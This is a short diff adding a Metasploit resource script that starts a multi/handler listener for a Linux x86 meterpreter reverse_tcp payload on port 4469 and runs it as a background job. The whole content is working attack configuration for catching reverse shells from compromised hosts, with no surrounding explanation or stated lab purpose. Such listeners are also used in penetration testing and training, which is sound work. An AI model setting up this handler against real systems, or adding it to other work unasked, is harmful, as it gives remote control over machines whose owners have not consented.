@@ -1,0 +1,4 @@
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lport 4469
+exploit -j
